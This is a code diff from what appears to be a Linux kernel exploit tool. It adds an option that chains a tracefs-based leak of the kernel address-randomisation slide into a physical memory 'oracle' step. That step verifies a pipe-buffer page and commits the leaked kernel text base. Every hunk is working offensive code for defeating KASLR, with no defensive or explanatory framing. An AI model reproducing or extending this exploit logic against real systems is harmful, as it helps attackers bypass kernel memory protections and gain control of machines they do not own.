@@ -191,6 +191,9 @@ static uint64_t slide_route_fine_delay_ticks;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 int slide_p0_session_fresh;
 #endif
+#if defined(APP_TRACEFS_SLIDE_ASSIST_P0) && APP_TRACEFS_SLIDE_ASSIST_P0
+static int slide_tracefs_slide_known;
+#endif
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 int p0_virtual_base_probe;
 #endif
@@ -208,7 +211,13 @@ static int slide_tracefs_leak_kernel_base(void) {
     return 0;
   }
   pr_success("slide tracefs leak source=%s slide=%08zx\n", source, slide);
-  return slide_commit_stext(KIMAGE_TEXT_BASE + slide, "tracefs");
+  if (!slide_commit_stext(KIMAGE_TEXT_BASE + slide, "tracefs")) {
+    return 0;
+  }
+#if defined(APP_TRACEFS_SLIDE_ASSIST_P0) && APP_TRACEFS_SLIDE_ASSIST_P0
+  slide_tracefs_slide_known = 1;
+#endif
+  return 1;
 }
 #endif
 
@@ -2054,6 +2063,20 @@ static int slide_leak_physical_base(void) {
       slide_restore_physical_oracle();
       return 0;
     }
+#if defined(APP_TRACEFS_SLIDE_ASSIST_P0) && APP_TRACEFS_SLIDE_ASSIST_P0
+    if (slide_tracefs_slide_known) {
+      if (!slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT)) {
+        pr_error("p0 tracefs-assisted gate restore failed\n");
+        return 0;
+      }
+      slide_p0_session_fresh = 1;
+      pr_success("p0 page verified with tracefs slide=%08zx page=%016zx "
+                 "pipe=%016zx\n", slide_p0_offset, page_base,
+                 pipebuf_page_base);
+      return slide_commit_stext(KIMAGE_TEXT_BASE + slide_p0_offset,
+                                "tracefs-physical");
+    }
+#endif
     if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
       slide_restore_physical_oracle();
       return 0;
@@ -2464,6 +2487,14 @@ int slide_leak_kernel_base(void) {
           slide_source && *slide_source ? slide_source : "auto");
   if (!force_p0) {
     if (slide_tracefs_leak_kernel_base()) {
+#if defined(APP_TRACEFS_SLIDE_ASSIST_P0) && APP_TRACEFS_SLIDE_ASSIST_P0
+      if (!force_tracefs) {
+        if (!slide_leak_physical_base()) {
+          pr_warning("p0 page discovery failed after tracefs slide\n");
+          return 0;
+        }
+      }
+#endif
       return 1;
     }
     if (force_tracefs) {
